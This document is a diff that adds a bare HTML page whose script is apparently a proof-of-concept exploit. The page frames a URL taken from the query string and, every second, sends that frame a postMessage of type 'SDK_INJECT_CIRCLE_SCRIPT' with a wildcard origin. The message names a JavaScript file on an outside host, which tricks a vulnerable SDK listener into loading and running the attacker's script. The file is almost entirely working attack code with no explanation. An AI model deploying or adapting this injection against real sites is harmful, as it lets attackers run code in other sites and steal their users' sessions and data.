@@ -1,0 +1,42 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+
+</body>
+<script>
+    var getUrlParameter = function getUrlParameter(sParam) {
+        var sPageURL = window.location.search.substring(1),
+            sURLVariables = sPageURL.split('&'),
+            sParameterName,
+            i;
+
+        for (i = 0; i < sURLVariables.length; i++) {
+            sParameterName = sURLVariables[i].split('=');
+
+            if (sParameterName[0] === sParam) {
+                return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
+            }
+        }
+        return false;
+    };
+
+    function foo(){
+        window[0].postMessage({"type":"SDK_INJECT_CIRCLE_SCRIPT","jsURL":"https://abrahamnn.github.io/test.js"},"*")
+    }
+    let url = getUrlParameter("url");
+    if (url.startsWith("http")){
+        let frame_ele = document.createElement("iframe");
+        frame_ele.src = url;
+        document.body.appendChild(frame_ele);
+        setInterval('foo()',1000);
+    }
+
+</script>
+
+</html>
